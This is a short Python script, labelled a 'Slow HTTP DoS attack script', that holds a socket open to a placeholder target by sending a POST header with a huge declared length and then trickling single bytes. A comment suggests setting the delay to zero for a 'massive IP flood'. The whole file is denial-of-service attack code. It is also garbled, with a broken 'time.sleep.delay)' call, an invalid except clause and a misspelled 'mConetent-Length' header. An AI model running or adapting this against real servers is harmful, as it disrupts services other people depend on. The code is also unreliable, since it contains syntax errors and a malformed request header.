import socket
import time

def slow_http_dos():

  """
        Slow HTTP DoS attack script.
        Args:
                Target = target <ip>
                Port = port  <No.>
                Timeout: Time to keep the connection alive. Default is 300 seconds.
                Delay: Delay between packets. Default is 10 seconds.
  """
  try:
          target="<destination_IP_Address>"
          port=80
          timeout=300
          delay=10 #this can be set to 0 to have a massive IP flood

          sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          sock.connect((target, port))

          sock.settimeout(timeout)

          print(f"[+] Connected to {target}:{port}")

          request = f"POST / HTTP/1.1\r\nHost: {target}\r\nmConetent-Length: 10000000\r\n\r\n"
          sock.send(request.encode('utf-8'))

          print(f"[+] Sent initial headers. Holding the connection...")

          while True:
                  sock.send('X'.encode('utf-8'))
                  print(f"[+] Sent keep-alive package. Waiting {delay} seconds...")
                  time.sleep.delay)

  except socket.error as e:
    print(f"[-] Socket Error: {e}")
  except socket KeyboardInterrupt:
    print("\n[+] Attack Stopped.")
  finally:
    sock.close()
    print("[+] Connection Closed.")
if __name__=="__main__":

    slow_http_dos()
